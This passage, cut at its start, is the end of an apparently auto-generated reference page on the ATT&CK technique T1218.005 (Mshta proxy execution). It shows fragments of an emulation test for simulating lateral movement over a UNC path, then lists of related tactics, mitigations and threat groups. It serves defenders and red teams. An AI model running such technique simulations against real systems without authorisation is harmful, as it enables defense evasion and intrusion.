                                                                                                            '-MSHTAFilePath '
                                                                                                            '#{mshta_file_path}',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'mshta_file_path': {'default': '$env:windir\\system32\\mshta.exe',
                                                                                                                            'description': 'Location '
                                                                                                                                           'of '
                                                                                                                                           'mshta.exe',
                                                                                                                            'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'Simulate '
                                                                                            'Lateral '
                                                                                            'Movement '
                                                                                            'over '
                                                                                            'UNC '
                                                                                            'Path',
                                                                                    'supported_platforms': ['windows']}],
                                                                  'attack_technique': 'T1218.005',
                                                                  'display_name': 'Signed '
                                                                                  'Binary '
                                                                                  'Proxy '
                                                                                  'Execution: '
                                                                                  'Mshta'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)

* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors


* [FIN7](../actors/FIN7.md)

* [APT32](../actors/APT32.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [Inception](../actors/Inception.md)
    
